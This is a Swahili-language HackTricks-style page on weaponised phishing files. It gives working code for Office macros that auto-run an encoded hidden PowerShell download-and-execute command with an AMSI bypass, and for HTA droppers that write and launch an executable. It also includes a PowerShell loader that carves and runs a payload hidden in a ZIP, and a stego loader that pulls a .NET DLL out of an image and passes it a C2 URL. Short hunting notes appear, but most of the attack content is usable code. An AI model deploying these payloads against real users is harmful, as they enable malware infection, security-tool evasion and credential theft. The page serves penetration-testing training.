# Faili na Nyaraka za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Nyaraka za Office

Microsoft Word hufanya uthibitisho wa data za faili kabla ya kufungua faili. Uthibitisho wa data hufanywa kwa njia ya utambuzi wa muundo wa data, kulingana na kiwango cha OfficeOpenXML. Ikiwa kosa lolote litatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kwa kawaida, faili za Word zenye macros hutumia kiendelezi `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi cha faili na bado kuhifadhi uwezo wao wa kutekeleza macros.\ Kwa mfano, faili la RTF halitegemei macros, kwa muundo, lakini faili la DOCM lililobadilishwa jina hadi RTF litatendewa na Microsoft Word na litakuwa na uwezo wa kutekeleza macros.\ Ndani na mbinu zile zile zinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint etc.).

Unaweza kutumia amri ifuatayo kuangalia ni viendelezi gani vitakavyotekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
Faili za DOCX zinazorejelea kiolezo cha mbali (File –Options –Add-ins –Manage: Templates –Go) ambacho kinajumuisha macros, pia zinaweza kuendesha macros.

### Kupakia Picha za Nje

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros - mlango wa nyuma

Inawezekana kutumia macros kuendesha msimbo wowote kutoka kwenye hati.

#### Autoload functions

Kadri zinavyokuwa za kawaida zaidi, ndivyo uwezekano wa AV kuzitambua utakavyoongezeka.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mkono

Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itaonyesha Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.

#### Doc Extension

Ukimaliza, chagua menyu ya kushuka ya **Save as type**, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivyo kwa sababu huwezi kuhifadhi macro ndani ya **`.docx`** na kuna mtazamo hasi kuhusu nyongeza ya macro-enabled **`.docm`** (mfano: ikoni ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/barua pepe zinaweza kuzizuia kabisa). Kwa hivyo, nyongeza ya zamani ya **`.doc`** ni suluhisho bora.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA ni programu ya Windows ambayo **inachanganya HTML na lugha za scripting (kama VBScript na JScript)**. Inaunda interface ya mtumiaji na inatekelezwa kama programu "fully trusted", bila vikwazo vya modeli ya usalama ya browser.

HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kawaida huwa **imewekwa** pamoja na **Internet Explorer**, na hivyo **`mshta` inategemea IE**. Kwa hivyo, ikiwa IE imeondolewa, HTA haitoweza kuendeshwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "kwa mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** katika barua pepe au HTML ambazo mtumiaji ataifungua (hata HTTP MitM?). Au kumtumia mwathiriwa **anwani ya faili** ambazo zita **trigger** **authentication** hata kwa **kufungua folda.**

**Angalia mawazo haya na mengine katika kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kuiba hash au authentication bali pia unaweza **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Kampeni zenye ufanisi mkubwa huwasilisha ZIP inayojumuisha nyaraka mbili halali za uwongo (PDF/DOCX) na .lnk hatari. Njia ni kwamba loader halisi wa PowerShell umehifadhiwa ndani ya bytes ghafi za ZIP baada ya alama ya kipekee, na .lnk inachonga na kuiendesha yote ndani ya kumbukumbu.

Mtiririko wa kawaida unaotekelezwa na .lnk PowerShell one-liner:

1) Tafuta ZIP ya asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na mzazi wa current working directory.
2) Soma bytes za ZIP na tafuta marker iliyowekwa kwa hardcode (mfano, xFIQCV). Yote iliyofuata baada ya marker ni payload ya PowerShell iliyowekwa ndani.
3) Nakili ZIP hadi %ProgramData%, uichome huko, na fungua .docx ya udanganyifu ili ionekane halali.
4) Kwepa AMSI kwa process ya sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Ondoa obfuscation ya hatua inayofuata (mfano, ondoa herufi zote #) na iite ndani ya kumbukumbu.

Mfano wa muundo wa PowerShell wa kuchonga na kuendesha hatua iliyojazwa ndani:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Vidokezo
- Usambazaji mara nyingi hutumia vibaya subdomains za PaaS zenye sifa nzuri (kwa mfano, *.herokuapp.com) na inaweza kuweka vizingiti kwa payloads (kutumikia ZIP zisizo hatari kulingana na IP/UA).
- Hatua inayofuata mara nyingi huondoa usimbaji wa base64/XOR shellcode na kuutekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza athari kwenye disk.

Persistence iliyotumika katika mnyororo uleule
- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au app yoyote inayoiingiza ianzishe tena payload kiautomatiki. Angalia maelezo na amri tayari-tumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files zinazobeba mfuatano wa alama wa ASCII (kwa mfano, xFIQCV) ulioambatishwa kwenye data ya archive.
- .lnk inayoorodhesha parent/user folders ili kupata ZIP na kufungua decoy document.
- Marekebisho ya AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Business threads zinazodumu kwa muda mrefu ambazo zinaishia kwa links zilizo-hosted chini ya domain za PaaS zinazoaminika.

## Payloads zilizotengwa na steganography katika picha (PowerShell stager)

Mnyororo wa loader wa hivi karibuni hutoa JavaScript/VBS iliyofichwa ambayo hu-decode na kuendesha Base64 PowerShell stager. Stager huyo hupakua picha (mara nyingi GIF) inayobeba .NET DLL iliyofichwa kama maandishi wazi yaliyowekwa kati ya alama za kuanza/kuisha za kipekee. Script inatafuta delimiters hizi (mifano iliyoonekana porini: «<<sudo_png>> … <<sudo_odt>>>»), hutoa maandishi yaliyoko katikati, hu-Base64-decode kuwa bytes, inaleta assembly ndani ya kumbukumbu na kuitisha method ya entry inayojulikana pamoja na C2 URL.

Mchakato
- Stage 1: Archived JS/VBS dropper → hufungua Base64 iliyojengewa ndani → inazindua PowerShell stager kwa -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → hupakua image, huchonga Base64 iliyotengwa na markers, inaleta .NET DLL in-memory na inaita method yake (mfano, VAI) ikipitisha C2 URL na options.
- Stage 3: Loader hupata final payload na kawaida huingiza kupitia process hollowing katika binary ya kuaminika (kawaida MSBuild.exe). Angalia zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell kuchonga DLL kutoka kwenye picha na kuitisha method ya .NET in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Vidokezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation kawaida hutumika kabla ya loading assembly.
- Uwindaji: chunguza picha zilizo pakuliwa kwa alama za kutenganisha zinazojulikana; tambua PowerShell inayofikia picha na mara moja ikitafsiri Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Awamu ya mwanzo inayojirudia ni `.js` au `.vbs` ndogo iliyofichwa sana iliyowekwa ndani ya archive. Lengo lake kuu ni decode Base64 string iliyojazwa ndani na kuanzisha PowerShell kwa `-nop -w hidden -ep bypass` ili bootstrap awamu inayofuata kupitia HTTPS.

Mantiki ya msingi (muhtasari):
- Soma maudhui ya faili yake mwenyewe
- Tafuta Base64 blob kati ya junk strings
- Decode hadi ASCII PowerShell
- Endesha kwa `wscript.exe`/`cscript.exe` zikimwita `powershell.exe`

Viashiria vya uwindaji
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Angalia ukurasa kuhusu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
